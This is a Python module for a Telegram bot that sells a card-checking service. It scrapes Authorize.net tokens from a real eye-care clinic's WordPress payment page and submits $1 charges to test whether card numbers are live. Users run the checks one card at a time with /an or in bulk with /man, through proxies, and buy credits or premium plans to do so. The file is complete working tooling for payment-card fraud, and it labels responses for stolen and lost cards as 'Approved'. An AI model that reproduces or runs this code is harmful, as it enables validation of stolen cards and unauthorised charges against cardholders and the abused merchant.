import re
import json
import requests
import asyncio
from time import time
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
from bs4 import BeautifulSoup
import random
from BOT.tools.proxy import get_proxy

user_locks = {}

# URLs from original API
BASE_URL = 'https://hudsonrivereyecare.com'
AJAX_URL = f'{BASE_URL}/wp-admin/admin-ajax.php'
AUTH_NET_URL = 'https://secure.authorize.net/gateway/transact.dll'

# Headers from original API
HEADERS_AJAX = {
    'Accept': '*/*',
    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Referer': f'{BASE_URL}/make-a-payment/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

HEADERS_POST = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}


class AuthnetGate:
    """Authorize.net $1 Charge Gate - Real Checking (Original API)"""
    
    def __init__(self, proxy=None):
        self.s = requests.Session()
        self.proxy = proxy
        
        # Apply proxy if provided
        if proxy:
            self.proxies = {'http': proxy, 'https': proxy}
        else:
            self.proxies = None
    
    def check_card(self, cc, mm, yy, cvv):
        """Full Authnet $1 charge check - Original API"""
        try:
            # Format expiration date for Authnet (MMYY) - exact as original
            exp_month_full = mm.zfill(2)
            exp_year_short = yy[-2:] if len(yy) >= 2 else yy
            exp_date_authnet = exp_month_full + exp_year_short
            
            # Step 1: Get tokens from AJAX endpoint - exact as original
            params_ajax = {
                'custom_amount': '1.00',
                'invoice_ajax': '',
                'rand': str(random.uniform(1.0, 3.0)),
                'action': 'wp_tp_authorize_net_ajax',
            }
            
            x = self.s.get(
                AJAX_URL,
                params=params_ajax,
                cookies=self.s.cookies,
                headers=HEADERS_AJAX,
                proxies=self.proxies,
                timeout=15
            )
            x.raise_for_status()
            
            # Extract tokens - exact regex as original
            login_match = re.search(r"name='x_login'\s+value='([^']*)'", x.text)
            hash_match = re.search(r"name='x_fp_hash'\s+value='([^']*)'", x.text)
            sequence_match = re.search(r"name='x_fp_sequence'\s+value='([^']*)'", x.text)
            time_match = re.search(r"name='x_fp_timestamp'\s+value='([^']*)'", x.text)
            
            if not all([login_match, hash_match, sequence_match, time_match]):
                return "Declined ❌", "Token Error"
            
            login = login_match.group(1)
            hash_val = hash_match.group(1)
            sequence = sequence_match.group(1)
            time_val = time_match.group(1)
            
            # Step 2: Submit to Authorize.net gateway - exact data as original
            data = [
                ('x_show_form', 'pf_receipt'),
                ('x_show_form', 'pf_receipt'),
                ('x_login', login),
                ('x_fp_hash', hash_val),
                ('x_amount', '1'),
                ('x_fp_timestamp', time_val),
                ('x_fp_sequence', sequence),
                ('x_version', '3.1'),
                ('x_description', 'We are happy to provide convenient and secure online payments for our clients.'),
                ('x_test_request', 'false'),
                ('x_method', 'cc'),
                ('x_header_html_payment_form', '<h1>Tarrytown and White Plains offices</h1>'),
                ('x_logo_url', 'https://hudsonrivereyecare.com/wp-content/uploads/2017/04/optometrist-in-tarrytown-white-plains-ny-hudson-river.jpg'),
                ('x_receipt_link_method', 'https://hudsonrivereyecare.com/wp-content/uploads/2017/04/optometrist-in-tarrytown-white-plains-ny-hudson-river.jpg'),
                ('x_header_html_receipt', 'THANK YOU FOR MAKING A PAYMENT'),
                ('x_invoice_num', 'Invoice Number'),
                ('x_card_num', cc),
                ('x_exp_date', exp_date_authnet),
                ('x_first_name', 'cash'),
                ('x_last_name', 'xpro'),
                ('x_company', 'Test Company'),
                ('x_address', '123 street St'),
                ('x_city', 'New York'),
                ('x_state', 'NY'),
                ('x_zip', '10001'),
                ('x_country', 'United States'),
                ('x_email', 'cashxpro@gmail.com'),
                ('x_phone', '5551234567'),
                ('x_fax', '5551234568'),
                ('x_ship_to_first_name', 'cash'),
                ('x_ship_to_last_name', 'xpro'),
                ('x_ship_to_company', 'Street Company'),
                ('x_ship_to_address', '123 street St'),
                ('x_ship_to_city', 'New York'),
                ('x_ship_to_state', 'NY'),
                ('x_ship_to_zip', '10001'),
                ('x_ship_to_country', 'United States'),
            ]
            
            res = self.s.post(
                AUTH_NET_URL,
                headers=HEADERS_POST,
                data=data,
                proxies=self.proxies,
                timeout=15
            )
            res.raise_for_status()
            
            # Parse response - exact as original
            soup = BeautifulSoup(res.text, 'html.parser')
            error_h2 = soup.find('h2', {'role': 'alert'})
            
            if error_h2:
                error_message = error_h2.text.strip()
                
                # If no error, it's Live
                if not error_message or "approved" in error_message.lower():
                    return "Charged 💎", "Charged $1"
                
                # Parse error codes
                error_lower = error_message.lower()
                if "insufficient" in error_lower:
                    return "Approved ✅", "Insufficient Funds"
                elif "do not honor" in error_lower:
                    return "Approved ✅", "Do Not Honor"
                elif "pickup" in error_lower:
                    return "Approved ✅", "Pickup Card"
                elif "lost" in error_lower:
                    return "Approved ✅", "Lost Card"
                elif "stolen" in error_lower:
                    return "Approved ✅", "Stolen Card"
                elif "cvv" in error_lower or "cvc" in error_lower or "security code" in error_lower:
                    return "CCN ✅", "CVV Mismatch"
                elif "expired" in error_lower:
                    return "Declined ❌", "Expired Card"
                elif "invalid" in error_lower:
                    return "Declined ❌", "Invalid Card"
                else:
                    return "Declined ❌", error_message[:40]
            else:
                # No error = Live (as per original: "else: return f"{full_info} >> Live")
                return "Charged 💎", "Charged $1"
                
        except requests.exceptions.Timeout:
            return "Declined ❌", "Timeout"
        except requests.exceptions.ProxyError:
            return "Declined ❌", "Proxy Error"
        except requests.exceptions.RequestException:
            return "Declined ❌", "Request Error"
        except Exception as e:
            return "Declined ❌", str(e)[:40]


def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_allowed_groups():
    try:
        with open("DATA/groups.json", "r") as f:
            return json.load(f)
    except:
        return []

def has_credits(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user.get("plan", {}).get("credits", 0)
        if credits == "∞":
            return True
        return int(credits) > 0
    except:
        return False

def deduct_credit(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        if int(credits) > 0:
            user["plan"]["credits"] = str(int(credits) - 1)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def deduct_credit_bulk(user_id, amount):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        credits = int(credits)
        if credits >= amount:
            user["plan"]["credits"] = str(credits - amount)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def extract_card(text):
    match = re.search(r'(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text)
    if match:
        return match.groups()
    return None

def extract_cards(text):
    return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)

def check_authnet(cc, mm, yy, cvv, proxy=None):
    """Full Authnet check"""
    gate = AuthnetGate(proxy=proxy)
    return gate.check_card(cc, mm, yy, cvv)

def is_free_user(user_id):
    try:
        users = load_users()
        user = users.get(str(user_id))
        if not user:
            return True
        plan = user.get("plan", {}).get("plan", "Free")
        return plan in ["Free", "Redeem Code"]
    except:
        return True

def is_premium_user(user_id):
    """Check if user is premium (not Free or Redeem Code)"""
    try:
        users = load_users()
        user = users.get(str(user_id))
        if not user:
            return False
        plan = user.get("plan", {}).get("plan", "Free")
        return plan not in ["Free", "Redeem Code"]
    except:
        return False

def get_owner_link():
    """Get owner link"""
    return "https://t.me/gitsus"


@Client.on_message(filters.command("an") & ~filters.edited)
async def authnet_single(client, message):
    """Single card Authnet $1 checker - Premium Only (Charged Gate)"""
    try:
        allowed_groups = load_allowed_groups()
        user_id = str(message.from_user.id)
        
        # Premium only check - Charged gate
        if not is_premium_user(user_id):
            return await message.reply(
                "<pre>Notification ❗️</pre>\n"
                "<b>~ Message :</b> <code>Only For Premium Users !</code>\n"
                '<b>~ Buy Premium →</b> <b><a href="https://t.me/gitsus">Click Here</a></b>\n'
                "━━━━━━━━━━━━━\n"
                "<b>Type <code>/buy</code> to get Premium.</b>",
                reply_to_message_id=message.id
            )
        
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>This Group Is Not Approved ⚠️</code>",
                )
        
        users = load_users()
        
        if user_id not in users:
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        if not has_credits(user_id):
            return await message.reply(
                "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                reply_to_message_id=message.id
            )
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            return await message.reply(
                "<pre>CC Not Found ❌</pre>\n<b>Usage:</b> <code>/an cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        extracted = extract_card(target_text)
        if not extracted:
            return await message.reply(
                "<pre>Invalid Format ❌</pre>\n<b>Usage:</b> <code>/an cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        cc, mm, yy, cvv = extracted
        fullcc = f"{cc}|{mm}|{yy}|{cvv}"
        
        proxy = get_proxy(message.from_user.id)
        
        start_time = time()
        
        loading_msg = await message.reply(
            f"<pre>✦ [$an] | Processing..!</pre>\n━━━━━━━━━━━━\n• <b>Card -</b> <code>{fullcc}</code>\n• <b>Gate -</b> <code>Authnet $1</code>",
            reply_to_message_id=message.id
        )
        
        loop = asyncio.get_event_loop()
        status, response = await loop.run_in_executor(None, check_authnet, cc, mm, yy, cvv, proxy)
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        user_data = users.get(user_id, {})
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎟️")
        
        # Clickable username
        profile = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        final_msg = f"""<b>[#Authnet] | Sos</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{fullcc}</code>
<b>[•] Gateway -</b> <code>Authnet $1</code>
<b>[•] Status-</b> <code>{status}</code>
<b>[•] Response-</b> <code>{response}</code>
━━━━━━━━━━━━━━━
<b>[ﾒ] Checked By:</b> {profile} [<code>{plan} {badge}</code>]
<b>[ﾒ] T/t:</b> <code>[{timetaken} 𝐬]</code>"""
        
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Support", url="https://t.me/gitsus"),
                InlineKeyboardButton("Owner", url=get_owner_link())
            ]
        ])
        
        await loading_msg.edit(final_msg, reply_markup=buttons, disable_web_page_preview=True)
        
        deduct_credit(user_id)
    
    except Exception as e:
        await message.reply(f"<code>Error: {str(e)[:50]}</code>", reply_to_message_id=message.id)


@Client.on_message(filters.command("man") & ~filters.edited)
async def authnet_mass(client, message):
    """Mass Authnet $1 checker - Premium Only (Charged Gate)"""
    user_id = str(message.from_user.id)
    
    if not message.from_user:
        return await message.reply("❌ Cannot process this message.")
    
    # Premium only check - Charged gate
    if not is_premium_user(user_id):
        return await message.reply(
            "<pre>Notification ❗️</pre>\n"
            "<b>~ Message :</b> <code>Only For Premium Users !</code>\n"
            '<b>~ Buy Premium →</b> <b><a href="https://t.me/gitsus">Click Here</a></b>\n'
            "━━━━━━━━━━━━━\n"
            "<b>Type <code>/buy</code> to get Premium.</b>",
            reply_to_message_id=message.id
        )
    
    if user_id in user_locks:
        return await message.reply(
            "<pre>⚠️ Wait!</pre>\n<b>Your previous /man is still processing.</b>",
            reply_to_message_id=message.id
        )
    
    user_locks[user_id] = True
    
    try:
        users = load_users()
        allowed_groups = load_allowed_groups()
        
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n<b>This Group Is Not Approved ⚠️</b>",
                    reply_to_message_id=message.id
                )
        
        if user_id not in users:
            user_locks.pop(user_id, None)
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        user_data = users[user_id]
        plan_info = user_data.get("plan", {})
        plan = plan_info.get("plan", "Free")
        badge = plan_info.get("badge", "🎟️")
        
        # Card limits based on plan - Ultimate: 100, VIP: 50
        if plan == "Ultimate":
            mlimit = 100
        elif plan == "VIP":
            mlimit = 50
        else:
            mlimit = plan_info.get("mlimit", 10)
        
        if mlimit is None or str(mlimit).lower() in ["null", "none"]:
            mlimit = 10000
        else:
            mlimit = int(mlimit)
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            user_locks.pop(user_id, None)
            return await message.reply(
                "❌ Send cards!\nFormat: <code>4111111111111111|12|25|123</code>",
                reply_to_message_id=message.id
            )
        
        all_cards = extract_cards(target_text)
        if not all_cards:
            user_locks.pop(user_id, None)
            return await message.reply("❌ No valid cards found!", reply_to_message_id=message.id)
        
        if len(all_cards) > mlimit:
            all_cards = all_cards[:mlimit]
        
        available_credits = user_data.get("plan", {}).get("credits", 0)
        card_count = len(all_cards)
        
        if available_credits != "∞":
            try:
                if card_count > int(available_credits):
                    user_locks.pop(user_id, None)
                    return await message.reply(
                        "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                        reply_to_message_id=message.id
                    )
            except:
                pass
        
        # Clickable username
        checked_by = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a> [<code>{plan} {badge}</code>]"
        
        proxy = get_proxy(message.from_user.id)
        
        loader_msg = await message.reply(
            f"<pre>✦ [$man] | M-Authnet</pre>\n"
            f"<b>[⚬] Gateway:</b> <b>Authnet $1</b>\n"
            f"<b>[⚬] Cards:</b> <code>{card_count}</code>\n"
            f"<b>[⚬] Status:</b> <code>Processing...</code>",
            reply_to_message_id=message.id
        )
        
        start_time = time()
        final_results = []
        loop = asyncio.get_event_loop()
        
        for card in all_cards:
            parts = card.split("|")
            if len(parts) == 4:
                cc, mm, yy, cvv = parts
                status, response = await loop.run_in_executor(None, check_authnet, cc, mm, yy, cvv, proxy)
                
                final_results.append(
                    f"[•] <b>Card:</b> <code>{card}</code>\n"
                    f"[•] <b>Status:</b> <code>{status}</code>\n"
                    f"[•] <b>Response:</b> <code>{response}</code>\n"
                    "━━━━━━━━━━━━"
                )
                
                # Show all results, cap at 20 during progress
                try:
                    display_results = final_results if len(final_results) <= 20 else final_results[-20:]
                    await loader_msg.edit(
                        f"<pre>✦ [$man] | M-Authnet</pre>\n"
                        + "\n".join(display_results) + "\n"
                        f"<b>[⚬] Progress:</b> <code>{len(final_results)}/{card_count}</code>\n"
                        f"<b>[⚬] Checked By:</b> {checked_by}",
                        disable_web_page_preview=True
                    )
                except:
                    pass
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        if available_credits != "∞":
            deduct_credit_bulk(user_id, card_count)
        
        # Show ALL results in final output
        final_text = f"<pre>✦ [$man] | M-Authnet</pre>\n"
        final_text += "\n".join(final_results) + "\n"
        final_text += f"<b>[ﾒ] T/t:</b> <code>[{timetaken} 𝐬]</code>\n"
        final_text += f"<b>[ﾒ] Total:</b> <code>{card_count} cards</code>\n"
        final_text += f"<b>[ﾒ] Checked By:</b> {checked_by}"
        
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Support", url="https://t.me/gitsus"),
                InlineKeyboardButton("Owner", url=get_owner_link())
            ]
        ])
        
        if len(final_text) > 4000:
            import os
            os.makedirs("downloads", exist_ok=True)
            filename = f"downloads/man_results_{user_id}.txt"
            
            with open(filename, "w") as f:
                f.write("Mass Authnet Results\n")
                f.write("=" * 50 + "\n\n")
                for result in final_results:
                    clean_result = result.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
                    f.write(clean_result + "\n")
                f.write("\n" + "=" * 50 + "\n")
                f.write(f"Time taken: {timetaken}s\n")
                f.write(f"Total cards: {card_count}\n")
            
            await message.reply_document(
                filename,
                caption=f"<pre>✦ [$man] | M-Authnet Results</pre>\n"
                        f"<b>[⚬] Total:</b> <code>{card_count} cards</code>\n"
                        f"<b>[⚬] T/t:</b> <code>{timetaken}s</code>\n"
                        f"<b>[⚬] Checked By:</b> {checked_by}",
                reply_to_message_id=message.id,
                reply_markup=buttons
            )
            await loader_msg.delete()
            os.remove(filename)
        else:
            await loader_msg.edit(
                final_text,
                disable_web_page_preview=True,
                reply_markup=buttons
            )
    
    except Exception as e:
        await message.reply(f"⚠️ Error: {str(e)[:50]}", reply_to_message_id=message.id)
    
    finally:
        user_locks.pop(user_id, None)
